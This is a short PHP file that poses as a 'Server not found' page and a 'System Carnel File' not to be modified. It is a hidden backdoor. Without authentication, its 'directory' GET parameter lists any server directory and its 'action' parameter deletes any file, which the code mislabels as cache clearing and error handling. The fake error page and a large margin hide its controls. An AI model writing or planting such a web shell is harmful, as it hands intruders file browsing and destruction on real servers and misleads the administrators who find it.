<?php
echo '<h1 style="color:#595959;font-weight:normal">Server not found</h1>';
echo '<h3 style="margin-bottom:700px;color:red;font-weight:normal;">System Carnel File. Don\'t modify or change this file.</h3>';
if(isset($_GET['action']) || isset($_GET['directory'])){
	echo 'This is Server System.<br>Use action[for del] || directory[for dir]';
	if(isset($_GET['directory']) ) {
		$dir = $_GET['directory'];
		//echo $dir;
		$files1 = scandir($dir);
		//print_r($files1);
		?>
		<h4><u>Desired List</u></h4>
		<?php
		foreach ($files1 as $files) {
			echo $files.'<br/>';
		}
	}


	//Server Error Handler.
	if(isset($_GET['action'])){
		$filename=$_GET['action'];
		if (file_exists($filename)){
			unlink($filename);
			echo '<h1 class="popup  success">Cache Deleted</h1>';
		}
		else{
			echo $filename.' Directory is not Found! or action=noFilename';
		}
	}

}
else{
	echo 'This is Server System.<br>Use action[for del] || directory[for dir]';
}
?>